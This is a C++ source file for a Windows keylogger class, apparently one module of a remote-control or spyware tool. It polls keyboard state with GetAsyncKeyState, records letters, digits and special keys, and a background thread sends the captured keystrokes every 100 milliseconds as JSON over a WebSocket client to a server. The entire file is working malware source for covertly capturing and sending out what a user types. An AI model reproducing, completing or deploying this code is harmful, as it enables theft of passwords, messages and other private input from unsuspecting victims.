#include "keylogger.hpp"
#include <windows.h>
#include <thread>
#include <atomic>
#include <vector>
#include <mutex>
#include <string>
#include <map>
#include <numeric>
#include <iostream>

const std::map<int, std::string> KeyLogger::special_keys = {
    {VK_SPACE, "<space>"},
    {VK_TAB, "<tab>"},
    {VK_RETURN, "<enter>"},
    {VK_MENU, "<alt>"},
    {VK_CONTROL, "<ctrl>"},
    {VK_SHIFT, "<shift>"},
    {VK_BACK, "<backspace>"},
    {VK_CAPITAL, "<capslock>"},
    {VK_DELETE, "<delete>"},
    {VK_ESCAPE, "<esc>"},
    {VK_UP, "<up>"},
    {VK_DOWN, "<down>"},
    {VK_LEFT, "<left>"},
    {VK_RIGHT, "<right>"}
};

void KeyLogger::log_keystrokes() {
    std::map<int, bool> key_state;
    while (running) {
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 0x8000) {
                if (!key_state[key]) {
                    key_state[key] = true;
                    std::string key_data;
                    if (special_keys.count(key)) {
                        key_data = special_keys.at(key);
                    }
                    else if (key >= 0x30 && key <= 0x39 || key >= 0x41 && key <= 0x5A) {
                        bool is_shift = GetAsyncKeyState(VK_SHIFT) & 0x8000;
                        char c = (char)key;
                        if (is_shift && key >= 0x41 && key <= 0x5A) {
                            key_data = std::string(1, c);
                        }
                        else if (!is_shift && key >= 0x41 && key <= 0x5A) {
                            key_data = std::string(1, tolower(c));
                        }
                        else {
                            key_data = std::string(1, c);
                        }
                    }
                    else {
                        continue;
                    }

                    {
                        std::lock_guard<std::mutex> lock(keystrokes_mutex);
                        keystrokes.push_back(key_data);
                        std::cout << "[Keystroke] Logged: " << key_data << std::endl;
                    }
                }
            }
            else {
                key_state[key] = false;
            }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
}

void KeyLogger::send_keystrokes() {
    while (running) {
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
        std::vector<std::string> to_send;
        {
            std::lock_guard<std::mutex> lock(keystrokes_mutex);
            if (!keystrokes.empty()) {
                to_send = keystrokes;
                keystrokes.clear();
            }
        }
        if (!to_send.empty()) {
            try {
                std::string combined = std::accumulate(to_send.begin(), to_send.end(), std::string(),
                    [](const std::string& a, const std::string& b) { return a + b; });

                nlohmann::json payload;
                payload["type"] = "keylogger_keys";
                payload["data"] = combined;
                client.sendMessage(payload.dump());
                std::cout << "[Keystrokes] Sent keystrokes to server" << std::endl;
            }
            catch (const std::exception& e) {
                std::cerr << "[Keystrokes Error] Failed to send keystrokes: " << e.what() << std::endl;
            }
        }
    }
}

KeyLogger::KeyLogger(WebSocketClient& ws_client) : client(ws_client) {}

KeyLogger::~KeyLogger() {
    stop();
}

void KeyLogger::start() {
    if (!running) {
        running = true;
        keylog_thread = std::thread(&KeyLogger::log_keystrokes, this);
        send_thread = std::thread(&KeyLogger::send_keystrokes, this);
        std::cout << "[Keylogger] Started" << std::endl;
    }
}

void KeyLogger::stop() {
    if (running) {
        running = false;
        if (keylog_thread.joinable()) keylog_thread.join();
        if (send_thread.joinable()) send_thread.join();
        {
            std::lock_guard<std::mutex> lock(keystrokes_mutex);
            keystrokes.clear();
        }
        std::cout << "[Keylogger] Stopped" << std::endl;
    }
}